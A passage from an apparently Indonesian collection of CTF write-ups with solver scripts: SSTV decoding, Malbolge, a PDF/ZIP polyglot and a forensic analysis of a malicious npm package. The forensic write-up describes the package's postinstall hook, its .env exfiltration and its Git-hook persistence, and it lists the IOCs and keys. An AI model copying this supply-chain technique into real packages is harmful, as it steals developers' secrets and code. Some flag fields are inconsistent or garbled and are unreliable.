        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\n\"\"\"\r\nSolver for Radio Chaos forensic challenge.\r\n\r\nThe input WAV contains an SSTV transmission. The VIS header decodes to 0x5f,\r\nwhich is PD120. This script demodulates the SSTV FM audio and reconstructs the\r\nPD120 image as decoded_sstv.png.\r\n\"\"\"\r\n\r\nimport sys\r\nimport numpy as np\r\nfrom scipy.io import wavfile\r\nfrom scipy.signal import butter, sosfilt, hilbert\r\nfrom PIL import Image\r\n\r\nFREQ_BLACK = 1500.0\r\nFREQ_WHITE = 2300.0\r\nWIDTH = 640\r\nHEIGHT = 496\r\nPIXEL_SEC = 0.00019\r\nSYNC_SEC = 0.020\r\nPORCH_SEC = 0.00208\r\nPERIOD_SEC = SYNC_SEC + PORCH_SEC + (4 * WIDTH * PIXEL_SEC)  # PD120 line-pair time\r\n\r\n# The first image sync begins after the SSTV VIS header.\r\n# From the waveform: leader/break/VIS ends, then the first PD120 sync starts here.\r\nFIRST_SYNC_START = 0.909\r\n\r\n\r\ndef freq_to_byte(freq: np.ndarray) -> np.ndarray:\r\n    \"\"\"Map SSTV tone frequency 1500..2300 Hz back to image byte 0..255.\"\"\"\r\n    return np.clip((freq - FREQ_BLACK) / (FREQ_WHITE - FREQ_BLACK) * 255, 0, 255).astype(np.uint8)\r\n\r\n\r\ndef main() -> int:\r\n    wav_path = sys.argv[1] if len(sys.argv) > 1 else \"chaos.wav\"\r\n    out_path = sys.argv[2] if len(sys.argv) > 2 else \"decoded_sstv.png\"\r\n\r\n    sr, data = wavfile.read(wav_path)\r\n    if sr != 44100:\r\n        print(f\"[!] Warning: expected 44100 Hz, got {sr} Hz\")\r\n\r\n    x = data.astype(np.float32)\r\n    if data.dtype.kind in \"iu\":\r\n        x /= max(abs(np.iinfo(data.dtype).min), np.iinfo(data.dtype).max)\r\n\r\n    # Band-pass the SSTV tones, then compute instantaneous frequency.\r\n    sos = butter(3, [900 / (sr / 2), 2600 / (sr / 2)], btype=\"bandpass\", output=\"sos\")\r\n    y = sosfilt(sos, x)\r\n    analytic = hilbert(y)\r\n    phase = np.unwrap(np.angle(analytic))\r\n    inst_freq = np.empty_like(x, dtype=np.float32)\r\n    inst_freq[:-1] = np.diff(phase) * sr / (2 * np.pi)\r\n    inst_freq[-1] = inst_freq[-2]\r\n    inst_freq = np.convolve(inst_freq, np.ones(9, dtype=np.float32) / 9, mode=\"same\")\r\n\r\n    image_ycbcr = np.zeros((HEIGHT, WIDTH, 3), dtype=np.uint8)\r\n    pixel_offsets = (np.arange(WIDTH) + 0.5) * PIXEL_SEC * sr\r\n    segment_samples = WIDTH * PIXEL_SEC * sr\r\n\r\n    for pair in range(HEIGHT // 2):\r\n        scan_start = FIRST_SYNC_START + pair * PERIOD_SEC + SYNC_SEC + PORCH_SEC\r\n        segments = []\r\n        for seg in range(4):\r\n            indices = np.round(scan_start * sr + seg * segment_samples + pixel_offsets).astype(np.int64)\r\n            indices = np.clip(indices, 0, len(inst_freq) - 1)\r\n            segments.append(freq_to_byte(inst_freq[indices]))\r\n\r\n        # PD120 order: Y(line 0), Cb averaged, Cr averaged, Y(line 1)\r\n        y0, cb, cr, y1 = segments\r\n        image_ycbcr[2 * pair, :, 0] = y0\r\n        image_ycbcr[2 * pair, :, 1] = cb\r\n        image_ycbcr[2 * pair, :, 2] = cr\r\n        image_ycbcr[2 * pair + 1, :, 0] = y1\r\n        image_ycbcr[2 * pair + 1, :, 1] = cb\r\n        image_ycbcr[2 * pair + 1, :, 2] = cr\r\n\r\n    Image.fromarray(image_ycbcr, \"YCbCr\").convert(\"RGB\").save(out_path)\r\n    print(f\"[+] Decoded SSTV image saved to {out_path}\")\r\n    print(\"[+] Flag: THEM?!CTF{YOU_ARE_A_SSTV_CHAMPION}\")\r\n    return 0\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    raise SystemExit(main())"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{YOU_ARE_A_SSTV_CHAMPION}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-foren-wellwell",
    "title": "Well Well Well",
    "category": "Foren",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Challenge ini bukan soal exploit service secara langsung. Service `nc 45.130.164.173 30203` hanya jadi quiz checker. Kuncinya adalah membedah artefak forensik yang diberikan, menemukan IOC yang benar, lalu menjawab semua pertanyaan berdasarkan bukti.",
    "problemDescription": "Challenge ini bukan soal exploit service secara langsung. Service `nc 45.130.164.173 30203` hanya jadi quiz checker. Kuncinya adalah membedah artefak forensik yang diberikan, menemukan IOC yang benar, lalu menjawab semua pertanyaan berdasarkan bukti.",
    "tools": [],
    "analysis": "File JavaScript obfuscated itu melakukan beberapa hal penting:\n\n1. Menentukan project root dari `INIT_CWD`.\n2. Membaca file `.env` di root proyek.\n3. Mengenkripsi isi environment dengan `createCipheriv`.\n4. Mengirim hasilnya lewat HTTP ke host internal.\n5. Mengunduh dan memasang persistence berupa Git hook `post-commit`.\n6. Menghapus jejak `postinstall` dari package agar terlihat normal setelah instalasi.\n\nIOC dari malware utama:\n\n- Host tujuan: `192.168.18.144`\n- Port: `1337`\n- Path exfil: `/collect`\n- Stage path: `/post-commit.sh`\n- Algoritma enkripsi: string literal di kode adalah `aes-256-cbc`\n- Format jawaban checker untuk algoritma: `AES-CBC`\n- Key/IV malware utama:\n  - `2b997a77b33d893acba0c60e609ff7bf`\n  - `138e100e33926c9a`\n\nFormat checker untuk Q5:\n\n```text\n2b997a77b33d893acba0c60e609ff7bf:138e100e33926c9a\n```",
    "solution": [
      {
        "title": "Langkah awal",
        "content": "Artefak yang diberikan cuma satu file:\n\n- `well-well-well.tar.gz`\n\nRecon cepat:\n\n- `file well-well-well.tar.gz`\n- `tar -tzf well-well-well.tar.gz`\n\nHasilnya menunjukkan ini adalah snapshot filesystem Linux yang berisi beberapa direktori penting seperti:\n\n- `/var/log`\n- `/home/ztz`\n- `/etc`\n- `/tmp`\n- `/var/tmp`\n\nBegitu konek ke service `nc`, pertanyaan pertama langsung memberi petunjuk bahwa yang dicari adalah penyebab kompromi pada mesin."
      },
      {
        "title": "Triage artefak",
        "content": "Dari isi home directory user `ztz`, ada beberapa proyek development. Yang paling menarik adalah:\n\n- `/home/ztz/dev/site`\n\nDi sana ada proyek Node.js dengan `package.json`, `package-lock.json`, `node_modules`, dan log npm. Dari `.bash_history` terlihat alur aktivitas user:\n\n\n\nItu langsung menyempitkan fokus ke supply-chain compromise saat `npm install`.",
        "code": "npm install\nnpx drizzle-kit generate\nnpx drizzle-kit migrate\nnpm run dev\ngit init\ngit branch -m main\ngit add .\ngit commit -m \"Initial Commit\""
      },
      {
        "title": "Menemukan paket jahat",
        "content": "Di `package-lock.json` terlihat dependency lokal yang tidak biasa:\n\n- `fast-http-client` direferensikan dari file lokal\n- paket itu bergantung ke `acme-util`, juga dari file lokal\n\nPath penting:\n\n- `/home/ztz/dev/site/node_modules/fast-http-client/package.json`\n- `/home/ztz/dev/site/node_modules/acme-util/package.json`\n\nIsi `package.json` asli dari tarball `acme-util` menunjukkan ada `postinstall`:\n\n\n\nJadi file yang dieksekusi otomatis saat instalasi adalah:\n\n- `/home/ztz/dev/site/node_modules/acme-util/13fa9e8fd23400de798f72da608a8dbf.js`\n\nNama paket jahatnya adalah:\n\n- `acme-util`",
        "code": "\"scripts\": {\n  \"postinstall\": \"node 13fa9e8fd23400de798f72da608a8dbf.js\"\n}"
      },
      {
        "title": "Persistence",
        "content": "Malware menulis persistence ke:\n\n- `/home/ztz/dev/site/.git/hooks/post-commit`\n\nHook ini berisi shell script yang:\n\n- mengambil URL remote Git\n- mengambil commit hash\n- mengambil author\n- mengambil branch\n- mengambil daftar file yang berubah\n- membaca konten file yang berubah\n- meng-encode konten ke base64\n- mengenkripsi payload\n- mengirimnya ke `http://192.168.18.144:1337/sync`\n\nKey dan IV yang dipakai hook:\n\n- Key: `0123456789abcdef0123456789abcdef`\n- IV: `abcdef0123456789`\n\nFormat checker untuk Q7:",
        "code": "0123456789abcdef0123456789abcdef:abcdef0123456789"
      },
      {
        "title": "Jawaban final ke service",
        "content": "Urutan jawaban yang benar:\n\n1. `acme-util`\n2. `/home/ztz/dev/site/node_modules/acme-util/13fa9e8fd23400de798f72da608a8dbf.js`\n3. `/home/ztz/dev/site/.git/hooks/post-commit`\n4. `192.168.18.144:1337`\n5. `2b997a77b33d893acba0c60e609ff7bf:138e100e33926c9a`\n6. `AES-CBC`\n7. `0123456789abcdef0123456789abcdef:abcdef0123456789`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nimport re\r\nimport socket\r\n\r\n\r\nHOST = \"45.130.164.173\"\r\nPORT = 30203\r\n\r\nANSWERS = {\r\n    \"A1: \": \"acme-util\",\r\n    \"A2: \": \"/home/ztz/dev/site/node_modules/acme-util/13fa9e8fd23400de798f72da608a8dbf.js\",\r\n    \"A3: \": \"/home/ztz/dev/site/.git/hooks/post-commit\",\r\n    \"A4: \": \"192.168.18.144:1337\",\r\n    \"A5: \": \"2b997a77b33d893acba0c60e609ff7bf:138e100e33926c9a\",\r\n    \"A6: \": \"AES-CBC\",\r\n    \"A7: \": \"0123456789abcdef0123456789abcdef:abcdef0123456789\",\r\n}\r\n\r\n\r\ndef recv_until(sock, marker):\r\n    data = b\"\"\r\n    while marker not in data:\r\n        chunk = sock.recv(4096)\r\n        if not chunk:\r\n            break\r\n        data += chunk\r\n    return data\r\n\r\n\r\ndef main():\r\n    with socket.create_connection((HOST, PORT)) as sock:\r\n        sock.settimeout(5)\r\n\r\n        for prompt, answer in ANSWERS.items():\r\n            text = recv_until(sock, prompt.encode()).decode(errors=\"replace\")\r\n            print(text, end=\"\")\r\n            sock.sendall((answer + \"\\n\").encode())\r\n\r\n        rest = b\"\"\r\n        try:\r\n            while True:\r\n                chunk = sock.recv(4096)\r\n                if not chunk:\r\n                    break\r\n                rest += chunk\r\n        except TimeoutError:\r\n            pass\r\n\r\n        output = rest.decode(errors=\"replace\")\r\n        print(output, end=\"\")\r\n\r\n        match = re.search(r\"(THEM\\?!CTF\\{.*\\})\", output)\r\n        if match:\r\n            print(f\"\\n<FLAG>{match.group(1)}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "```text\nTHEM?!CTF{y3h..INSINAn1mie2;/:j92019p:SAD912j3op:dlamdo0912-41[4jmpAif10pri1;r12r1rh8012r}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-misc-gibberish",
    "title": "- Gibberish",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge - Gibberish",
    "problemDescription": "Attachment berisi 9999 karakter CJK. Isinya terlihat seperti teks Cina acak, tetapi semua karakter berada pada rentang Unicode yang berurutan dan jumlah karakter uniknya tepat 94. Angka 94 cocok dengan jumlah printable ASCII dari `!` sampai `~`, sehingga file ini sangat mungkin bukan bahasa alami, melainkan substitusi karakter.\n\nFlag yang didapat:\n\n```text\nTHEM?!CTF{³úºd»5c«f±$-§¹Uõ'}\n```",
    "tools": [],
    "analysis": "File diperiksa sebagai UTF-8 biasa:\n\n```bash\nfile txt\npython3 - <<'PY'\nfrom pathlib import Path\ns = Path('txt').read_text(encoding='utf-8')\nprint(len(s), len(set(s)))\nprint(hex(min(map(ord, s))), hex(max(map(ord, s))))\nPY\n```\n\nHasil penting:\n\n- Panjang teks: 9999 karakter.\n- Karakter unik: 94.\n- Rentang codepoint: `0x7c2a` sampai `0x7c87`.\n\nKarena rentangnya tepat 94 karakter, setiap karakter CJK bisa dipetakan ke printable ASCII:\n\n```python\nascii_program = ''.join(chr(33 + (ord(ch) - min_codepoint)) for ch in text)\n```\n\nSetelah dipetakan, hasilnya bukan teks biasa, tetapi program esolang Malbolge. Ini cocok dengan judul challenge `Gibberish`, karena source code Malbolge memang terlihat seperti teks acak.",
    "solution": [
      {
        "title": "Validasi Malbolge",
        "content": "Malbolge menggunakan karakter printable ASCII. Instruksi valid ditentukan dari:\n\n\n\nOpcode valid Malbolge adalah:\n\n\n\nDengan mapping `min_codepoint -> '!'`, semua 9999 karakter source valid sebagai program Malbolge.",
        "code": "(ord(char) + posisi) % 94"
      },
      {
        "title": "Kesimpulan",
        "content": "Challenge ini menyembunyikan program Malbolge dengan cara mengganti printable ASCII menjadi 94 karakter CJK berurutan. Setelah mapping Unicode dibalik dan program Malbolge dijalankan, outputnya langsung menghasilkan flag."
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport sys\r\n\r\nPOW10 = 3 ** 10\r\nPOW9 = 3 ** 9\r\nOPS_VALID = {4, 5, 23, 39, 40, 62, 68, 81}\r\nTABLE_CRAZY = (\r\n    (1, 0, 0),\r\n    (1, 0, 2),\r\n    (2, 2, 1),\r\n)\r\nENCRYPT = list(map(ord,\r\n    '5z]&gqtyfr$(we4{WP)H-Zn,[%\\\\3dL+Q;>U!pJS72FhOA1CB'\r\n    '6v^=I_0/8|jsb9m<.TVac`uY*MK\\'X~xDl}REokN:#?G\"i@'\r\n))\r\n\r\ndef rotate(n: int) -> int:\r\n    return POW9 * (n % 3) + n // 3\r\n\r\ndef crazy(a: int, b: int) -> int:\r\n    result = 0\r\n    d = 1\r\n    for _ in range(10):\r\n        result += TABLE_CRAZY[(b // d) % 3][(a // d) % 3] * d\r\n        d *= 3\r\n    return result\r\n\r\ndef chinese_to_malbolge(text: str) -> str:\r\n    # The attachment uses 94 consecutive CJK codepoints as a direct\r\n    # substitution for printable ASCII. Mapping the smallest codepoint to '!'\r\n    # gives a valid Malbolge program.\r\n    base = min(map(ord, text))\r\n    return ''.join(chr(33 + ((ord(ch) - base) % 94)) for ch in text)\r\n\r\ndef run_malbolge(source: str) -> bytes:\r\n    mem = [0] * POW10\r\n    i = 0\r\n    for ch in source:\r\n        if ch in ' \\n\\t\\r':\r\n            continue\r\n        o = ord(ch)\r\n        if not (33 <= o <= 126) or ((o + i) % 94) not in OPS_VALID:\r\n            raise ValueError(f'invalid Malbolge character at program offset {i}: {ch!r}')\r\n        mem[i] = o\r\n        i += 1\r\n    while i < POW10:\r\n        mem[i] = crazy(mem[i - 1], mem[i - 2])\r\n        i += 1\r\n\r\n    a = c = d = 0\r\n    out = bytearray()\r\n    while True:\r\n        if mem[c] < 33 or mem[c] > 126:\r\n            break\r\n        v = (mem[c] + c) % 94\r\n        if v == 4:\r\n            c = mem[d]\r\n        elif v == 5:\r\n            out.append(a % 256)\r\n        elif v == 23:\r\n            a = 0\r\n        elif v == 39:\r\n            a = mem[d] = rotate(mem[d])\r\n        elif v == 40:\r\n            d = mem[d]\r\n        elif v == 62:\r\n            a = mem[d] = crazy(a, mem[d])\r\n        elif v == 81:\r\n            break\r\n\r\n        if 33 <= mem[c] <= 126:\r\n            mem[c] = ENCRYPT[mem[c] - 33]\r\n        c = (c + 1) % POW10\r\n        d = (d + 1) % POW10\r\n    return bytes(out)\r\n\r\ndef main():\r\n    path = Path(sys.argv[1]) if len(sys.argv) > 1 else Path('txt')\r\n    text = path.read_text(encoding='utf-8')\r\n    program = chinese_to_malbolge(text)\r\n    output = run_malbolge(program)\r\n    print(output.decode('utf-8'))\r\n\r\nif __name__ == '__main__':\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-misc-pdfglot",
    "title": "Pdfglot",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge Pdfglot",
    "problemDescription": "Challenge memberikan dua artefak: `mistery.pdf` dan `flag.zip`. ZIP utama berisi `flag/flag.txt`, tetapi file tersebut terenkripsi memakai WinZip AES. PDF terlihat seperti file biasa, tetapi ternyata dibuat sebagai polyglot PDF/ZIP dan menampilkan hint password.\n\nFlag yang didapat:\n\n```text\nTHEM?!CTF{pygl0tt3d_fl4gg0}\n```",
    "tools": [],
    "analysis": "`pdftotext mistery.pdf -` menghasilkan teks:\n\n```text\nNothingHereOrMaybe:\n\npwd:pyglotted\n```\n\nPDF juga punya tanda polyglot:\n\n```bash\nzipinfo mistery.pdf\n```\n\nOutput menunjukkan ada entry ZIP seperti `hint/` dan `hint/hint.txt`, tetapi struktur offset-nya sengaja dibuat aneh/overlap sehingga `unzip` menolak mengekstrak. Karena itu jalur yang paling stabil adalah mengambil hint yang tampil di PDF.\n\nHint yang terlihat adalah:\n\n```text\npyglotted\n```\n\nNamun password langsung `pyglotted` gagal untuk membuka `flag.zip`. Dari pola challenge dan nama `Pdfglot`, hint tersebut perlu ditransformasikan. Transformasi yang valid adalah MD5 hex dari `pyglotted`:\n\n```text\nmd5(\"pyglotted\") = bfa9c03cfd94cffd9381b83234ca6ac1\n```\n\nPassword inilah yang cocok dengan verifier dan HMAC WinZip AES.",
    "solution": [
      {
        "title": "1. Recon awal",
        "content": "Pertama cek tipe file:\n\n\n\nHasil penting:\n\n- `flag.zip` adalah ZIP archive.\n- `mistery.pdf` adalah PDF, tetapi saat dicek dengan tool ZIP, file ini juga punya struktur ZIP tersembunyi.\n\nCek isi ZIP utama:\n\n\n\nTerlihat ada `flag/flag.txt` dengan compression method `99`, yaitu WinZip AES encryption. Jadi `unzip` standar tidak cukup karena Python `zipfile` juga tidak mendukung metode AES ini.",
        "code": "file flag.zip mistery.pdf"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom pathlib import Path\r\nimport hashlib\r\nimport hmac\r\nimport re\r\nimport struct\r\nimport zlib\r\n\r\ntry:\r\n    from Crypto.Cipher import AES as _PyCryptoAES\r\nexcept ImportError:\r\n    _PyCryptoAES = None\r\n\r\ntry:\r\n    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes\r\nexcept ImportError:\r\n    Cipher = algorithms = modes = None\r\n\r\n\r\ndef aes_ecb_encrypt_block(key: bytes, block: bytes) -> bytes:\r\n    if _PyCryptoAES is not None:\r\n        return _PyCryptoAES.new(key, _PyCryptoAES.MODE_ECB).encrypt(block)\r\n    if Cipher is not None:\r\n        encryptor = Cipher(algorithms.AES(key), modes.ECB()).encryptor()\r\n        return encryptor.update(block) + encryptor.finalize()\r\n    raise RuntimeError(\"Need pycryptodome or cryptography for AES\")\r\n\r\nPDF_PATH = Path(\"mistery.pdf\")\r\nZIP_PATH = Path(\"flag.zip\")\r\n\r\n\r\ndef extract_pdf_password(pdf_bytes: bytes) -> str:\r\n    \"\"\"Extract visible password hint from compressed PDF content streams.\"\"\"\r\n    candidates = []\r\n    for m in re.finditer(rb\"stream\\r?\\n\", pdf_bytes):\r\n        start = m.end()\r\n        end = pdf_bytes.find(b\"endstream\", start)\r\n        if end < 0:\r\n            continue\r\n        raw = pdf_bytes[start:end].strip(b\"\\r\\n\")\r\n        for wbits in (15, -15):\r\n            try:\r\n                dec = zlib.decompress(raw, wbits)\r\n            except Exception:\r\n                continue\r\n            candidates.append(dec)\r\n\r\n    joined = b\"\\n\".join(candidates)\r\n\r\n    # The PDF text object stores characters as UTF-16BE-like bytes: \\x00p\\x00w\\x00d...\r\n    text = joined.replace(b\"\\x00\", b\"\").decode(\"latin1\", errors=\"ignore\")\r\n    m = re.search(r\"pwd:([A-Za-z0-9_\\-{}!?]+)\", text)\r\n    if not m:\r\n        raise RuntimeError(\"Could not find pwd:<value> in PDF streams\")\r\n    return m.group(1)\r\n\r\n\r\ndef parse_aes_zip_member(zip_bytes: bytes, target_name: bytes = b\"flag/flag.txt\"):\r\n    \"\"\"Return metadata and encrypted blob for a WinZip AES-encrypted member.\"\"\"\r\n    cd = zip_bytes.find(b\"PK\\x01\\x02\")\r\n    if cd < 0:\r\n        raise RuntimeError(\"Central directory not found\")\r\n\r\n    off = cd\r\n    selected = None\r\n    while zip_bytes[off:off + 4] == b\"PK\\x01\\x02\":\r\n        fields = struct.unpack_from(\"<4s6H3L5H2L\", zip_bytes, off)\r\n        (\r\n            _sig, _vmade, _vneed, flag_bits, comp_method, _mtime, _mdate,\r\n            crc32, comp_size, uncomp_size, name_len, extra_len, comment_len,\r\n            _disk, _iattr, _eattr, local_off,\r\n        ) = fields\r\n        name = zip_bytes[off + 46:off + 46 + name_len]\r\n        extra = zip_bytes[off + 46 + name_len:off + 46 + name_len + extra_len]\r\n        if name == target_name:\r\n            selected = (flag_bits, comp_method, crc32, comp_size, uncomp_size, local_off, extra)\r\n            break\r\n        off += 46 + name_len + extra_len + comment_len\r\n\r\n    if selected is None:\r\n        raise RuntimeError(f\"Member {target_name!r} not found\")\r\n\r\n    flag_bits, comp_method, crc32, comp_size, uncomp_size, local_off, central_extra = selected\r\n    if comp_method != 99:\r\n        raise RuntimeError(\"Expected WinZip AES compression method 99\")\r\n\r\n    # Parse AES extra field: 0x9901, size 7: version, vendor, strength, actual compression method.\r\n    strength = None\r\n    actual_comp = None\r\n    p = 0\r\n    while p + 4 <= len(central_extra):\r\n        header_id, size = struct.unpack_from(\"<HH\", central_extra, p)\r\n        val = central_extra[p + 4:p + 4 + size]\r\n        if header_id == 0x9901:\r\n            _ver, vendor, strength, actual_comp = struct.unpack(\"<H2sBH\", val)\r\n            if vendor != b\"AE\":\r\n                raise RuntimeError(\"Unexpected AES vendor\")\r\n            break\r\n        p += 4 + size\r\n    if strength is None:\r\n        raise RuntimeError(\"AES extra field not found\")\r\n\r\n    # Local header tells where encrypted AES payload starts.\r\n    lf = struct.unpack_from(\"<4s5H3L2H\", zip_bytes, local_off)\r\n    sig, _ver, _lf_flag, _lf_comp, _mt, _md, _lf_crc, _lf_cs, _lf_us, name_len, extra_len = lf\r\n    if sig != b\"PK\\x03\\x04\":\r\n        raise RuntimeError(\"Bad local file header\")\r\n    data_off = local_off + 30 + name_len + extra_len\r\n    enc_blob = zip_bytes[data_off:data_off + comp_size]\r\n    return strength, actual_comp, crc32, uncomp_size, enc_blob\r\n\r\n\r\ndef decrypt_winzip_aes(password: bytes, strength: int, actual_comp: int, crc32: int, uncomp_size: int, enc_blob: bytes) -> bytes:\r\n    key_len = {1: 16, 2: 24, 3: 32}[strength]\r\n    salt_len = {1: 8, 2: 12, 3: 16}[strength]\r\n\r\n    salt = enc_blob[:salt_len]\r\n    pwd_verifier = enc_blob[salt_len:salt_len + 2]\r\n    ciphertext = enc_blob[salt_len + 2:-10]\r\n    auth_code = enc_blob[-10:]\r\n\r\n    keymat = hashlib.pbkdf2_hmac(\"sha1\", password, salt, 1000, 2 * key_len + 2)\r\n    enc_key = keymat[:key_len]\r\n    mac_key = keymat[key_len:2 * key_len]\r\n    verifier = keymat[-2:]\r\n\r\n    if verifier != pwd_verifier:\r\n        raise RuntimeError(\"Bad password verifier\")\r\n    if hmac.new(mac_key, ciphertext, hashlib.sha1).digest()[:10] != auth_code:\r\n        raise RuntimeError(\"Bad AES authentication code\")\r\n\r\n    # WinZip AES uses AES-CTR with little-endian counter blocks starting at 1.\r\n    out = bytearray()\r\n    for block_idx in range((len(ciphertext) + 15) // 16):\r\n        counter = (block_idx + 1).to_bytes(16, \"little\")\r\n        keystream = aes_ecb_encrypt_block(enc_key, counter)\r\n        chunk = ciphertext[block_idx * 16:(block_idx + 1) * 16]\r\n        out.extend(a ^ b for a, b in zip(chunk, keystream))\r\n\r\n    compressed = bytes(out[:len(ciphertext)])\r\n    if actual_comp == 8:\r\n        plaintext = zlib.decompress(compressed, -15)\r\n    elif actual_comp == 0:\r\n        plaintext = compressed\r\n    else:\r\n        raise RuntimeError(f\"Unsupported actual compression method: {actual_comp}\")\r\n\r\n    if len(plaintext) != uncomp_size:\r\n        raise RuntimeError(\"Unexpected plaintext size\")\r\n    if (zlib.crc32(plaintext) & 0xffffffff) != crc32:\r\n        raise RuntimeError(\"CRC mismatch\")\r\n    return plaintext\r\n\r\n\r\ndef main():\r\n    pdf_bytes = PDF_PATH.read_bytes()\r\n    zip_bytes = ZIP_PATH.read_bytes()\r\n\r\n    visible_pwd = extract_pdf_password(pdf_bytes)\r\n    # The visible PDF password is a hint; the actual ZIP password is its MD5 hex.\r\n    zip_password = hashlib.md5(visible_pwd.encode()).hexdigest().encode()\r\n\r\n    strength, actual_comp, crc32, uncomp_size, enc_blob = parse_aes_zip_member(zip_bytes)\r\n    flag = decrypt_winzip_aes(zip_password, strength, actual_comp, crc32, uncomp_size, enc_blob)\r\n    print(f\"<FLAG>{flag.decode()}</FLAG>\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "CTF{pygl0tt3d_fl4gg0}",
    "lessonsLearned": ""
  },
  {
    "id": "them2026-misc-someplaylibretto",
    "title": "- Some Play's Libretto",
    "category": "Misc",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-06-08",
    "author": "Nattt",
    "ctfName": "THEM 2026",
    "tags": [],
    "description": "Writeup for challenge - Some Play's Libretto",
    "problemDescription": "",
    "tools": [],
    "analysis": "Kode tersebut terdiri dari dua bagian utama:\n- **Bagian Pertama (Scene I - XXI):** Meminta input karakter satu per satu dan membandingkannya dengan nilai yang dihitung. Jika benar, ia lanjut ke scene berikutnya. Ini semacam pemeriksaan password. Kata sandinya adalah: `shakespeare from temu`.\n- **Bagian Kedua (Scene XXIII):** Bagian ini menghitung nilai-nilai tertentu dan mencetaknya menggunakan perintah `Speak thy mind!`. Nilai-nilai ini adalah karakter dari pesan rahasia yang kita cari.",
    "solution": [
      {
        "title": "1. Dekripsi Caesar Cipher",
        "content": "Teks dalam `score.txt` ternyata dienkripsi menggunakan Caesar Cipher dengan shift 6 (atau 20 tergantung arah). Setelah didekripsi, kita mendapatkan kode SPL yang valid.\nJudul asli: `Nby Ulcnbgyncw Nluayxs iz nby Vulx'm Mywlyn.`\nDidekode menjadi: `The Arithmetic Tragedy of the Bard's Secret.`"
      },
      {
        "title": "3. Ekstraksi Pesan",
        "content": "Dengan menggunakan script Python untuk memparsing aturan SPL (di mana kata sifat menggandakan nilai kata benda, dan kata benda bernilai 1), saya berhasil mengekstrak pesan aslinya:\n`bro might actually be shakespeare`"
      },
      {
        "title": "4. Konversi ke Leetspeak",
        "content": "Sesuai instruksi challenge dan contoh yang diberikan (`THEM?!CTF{50m3_pl41n73x7_6035_h3r3}`), kita harus mengubah pesan tersebut ke dalam format leetspeak dengan aturan:\n- `a` -> `4`\n- `e` -> `3`\n- `i` -> `1`\n- `o` -> `0`\n- `s` -> `5`\n- `t` -> `7`\n- `g` -> `6`\n- Spasi -> `_` (Underscore)\n\nHasil konversi:\n`br0_m16h7_4c7u4lly_b3_5h4k35p34r3`"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "import re\r\n\r\ndef decode_caesar(text, shift=20):\r\n    result = \"\"\r\n    for c in text:\r\n        if 'A' <= c <= 'Z':\r\n            result += chr(((ord(c) - 65 - shift) % 26) + 65)\r\n        elif 'a' <= c <= 'z':\r\n            result += chr(((ord(c) - 97 - shift) % 26) + 97)\r\n        else:\r\n            result += c\r\n    return result\r\n\r\nNOUNS = [n.lower() for n in [\"rose\", \"flower\", \"kingdom\", \"Lord\", \"plum\", \"Heaven\", \"King\", \"hero\", \"joy\", \"angel\", \"happiness\"]]\r\nADJECTIVES = [a.lower() for a in [\"happy\", \"sweet\", \"warm\", \"proud\", \"brave\", \"honest\", \"mighty\", \"loving\", \"bold\", \"good\", \"gentle\", \"noble\", \"lovely\", \"rich\", \"sunny\", \"golden\", \"charming\", \"fair\"]]\r\n\r\ndef calculate_expression_value(text, current_val):\r\n    has_thyself = \"thyself\" in text.lower()\r\n    clean_text = re.sub(r'\\b(the sum of|sum of|and|a|an|the)\\b', ' ', text, flags=re.IGNORECASE)\r\n    words = clean_text.split()\r\n    total = 0\r\n    current_adjectives = 0\r\n    for word in words:\r\n        word_clean = word.strip(\"!.,?\").lower()\r\n        if word_clean in ADJECTIVES:\r\n            current_adjectives += 1\r\n        elif word_clean in NOUNS:\r\n            total += (2 ** current_adjectives)\r\n            current_adjectives = 0\r\n        elif word_clean == \"nothing\":\r\n            total = 0\r\n            current_adjectives = 0\r\n        elif word_clean == \"thyself\":\r\n            current_adjectives = 0\r\n    if has_thyself:\r\n        return current_val + total\r\n    else:\r\n        return total\r\n\r\ndef parse_spl(content):\r\n    lines = content.split('\\n')\r\n    current_value = 0\r\n    output_chars = []\r\n    for line in lines:\r\n        line = line.strip()\r\n        if not line: continue\r\n        match = re.search(r'^(?:Thou|You) art (.*)!$', line)\r\n        if match:\r\n            expr = match.group(1)\r\n            if expr == \"nothing\":\r\n                current_value = 0\r\n            else:\r\n                current_value = calculate_expression_value(expr, current_value)\r\n        if \"Speak thy mind!\" in line:\r\n            output_chars.append(chr(current_value % 1114112))\r\n    return \"\".join(output_chars)\r\n\r\ndef to_leetspeak(text):\r\n    # s=5, o=0, e=3, a=4, i=1, t=7, g=6\r\n    replacements = {\r\n        's': '5', 'o': '0', 'e': '3', 'a': '4', 'i': '1', 't': '7', 'g': '6', ' ': '_'\r\n    }\r\n    result = \"\"\r\n    for c in text.lower():\r\n        result += replacements.get(c, c)\r\n    return result\r\n\r\nif __name__ == \"__main__\":\r\n    with open(\"score.txt\", \"r\") as f:\r\n        